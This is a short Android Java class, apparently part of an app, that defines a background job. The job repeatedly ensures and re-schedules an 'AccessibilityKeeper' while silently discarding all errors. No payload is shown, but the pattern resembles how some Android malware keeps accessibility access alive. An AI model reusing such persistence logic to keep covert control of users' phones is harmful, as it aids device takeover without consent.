package com.seguranca.protecao;

import android.app.job.JobParameters;
import android.app.job.JobService;

public class AccessibilityKeeperJob extends JobService {
    @Override public boolean onStartJob(JobParameters p) {
        try { AccessibilityKeeper.garantir(this); AccessibilityKeeper.agendar(this); } catch (Throwable t) {}
        return false;
    }
    @Override public boolean onStopJob(JobParameters p) { return true; }
}